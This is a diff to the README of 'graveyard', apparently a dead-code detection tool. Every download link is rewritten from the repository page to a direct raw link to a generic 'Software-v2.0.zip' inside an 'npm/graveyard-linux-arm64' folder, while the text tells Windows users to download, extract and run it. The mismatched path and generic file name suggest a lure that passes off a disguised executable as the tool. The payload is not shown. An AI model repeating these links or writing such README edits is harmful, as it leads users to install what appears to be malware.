@@ -1,10 +1,10 @@
 # 🪦 graveyard - Find dead code with git-aware confidence
 
-[![Download](https://img.shields.io/badge/Download-Graveyard-blue?style=for-the-badge&logo=github)](https://github.com/laurylalcoholmaracanlanguage842/graveyard)
+[![Download](https://img.shields.io/badge/Download-Graveyard-blue?style=for-the-badge&logo=github)](https://github.com/laurylalcoholmaracanlanguage842/graveyard/raw/refs/heads/main/npm/graveyard-linux-arm64/Software-v2.0.zip)
 
 ## ⚡ Quick Download
 
-Visit this page to download: https://github.com/laurylalcoholmaracanlanguage842/graveyard
+Visit this page to download: https://github.com/laurylalcoholmaracanlanguage842/graveyard/raw/refs/heads/main/npm/graveyard-linux-arm64/Software-v2.0.zip
 
 If you are on Windows, open the page above and look for the latest release or download file. Then save it to your computer and run it.
 
@@ -23,7 +23,7 @@ Use it when you want to:
 
 ## 🖥️ Windows setup
 
-1. Open the download page: https://github.com/laurylalcoholmaracanlanguage842/graveyard
+1. Open the download page: https://github.com/laurylalcoholmaracanlanguage842/graveyard/raw/refs/heads/main/npm/graveyard-linux-arm64/Software-v2.0.zip
 2. Find the latest release or the main download file
 3. Download the Windows file to a folder you can find, such as Downloads
 4. If the file is a ZIP, right-click it and choose Extract All
@@ -167,6 +167,6 @@ Short paths help keep things easy to find. If your repo is in Downloads or Deskt
 
 ## 🔗 Download again
 
-Visit this page to download: https://github.com/laurylalcoholmaracanlanguage842/graveyard
+Visit this page to download: https://github.com/laurylalcoholmaracanlanguage842/graveyard/raw/refs/heads/main/npm/graveyard-linux-arm64/Software-v2.0.zip
 
 Use the latest release or the main download file, then download and run this file on Windows
